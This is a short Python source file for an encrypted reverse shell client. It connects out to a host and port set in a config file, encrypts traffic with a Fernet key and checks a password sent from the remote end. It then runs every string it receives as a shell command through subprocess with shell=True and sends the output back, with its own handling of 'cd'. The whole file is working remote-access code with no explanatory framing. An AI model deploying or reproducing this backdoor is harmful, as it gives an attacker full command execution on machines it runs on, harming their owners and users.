import os
import subprocess
import socket
import traceback

from cryptography.fernet import Fernet
from config import CONFIG


def send(string):
    global soc, enc
    message = string.encode()
    soc.send(enc.encrypt(message))


def recv(length):
    global soc, enc
    decrypted = enc.decrypt(soc.recv(length))
    message = decrypted.decode()
    return message


def login():
    global soc
    send("Login: ")
    pwd = recv(20000)
    if pwd.strip() == CONFIG.pwd:
        send("Successful Login")
        return True
    send("Wrong Password")
    return False


def shell():
    global soc
    while True:
        data = recv(20000)
        output = ""

        if data.strip() == ":quit":
            return
        elif data.strip()[0:2] == "cd":
            try:
                os.chdir(data.strip()[2:].strip())
            except:
                output = traceback.format_exc()
        else:
            command = subprocess.Popen(
                data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = command.stdout.read().decode() + " " + command.stderr.read().decode()

        send(output)


if __name__ == "__main__":
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((CONFIG.host, CONFIG.port))
    key_file = open(CONFIG.key_file, 'rb')
    key = key_file.read()
    key_file.close()
    enc = Fernet(key)
    while not login():
        continue
    shell()
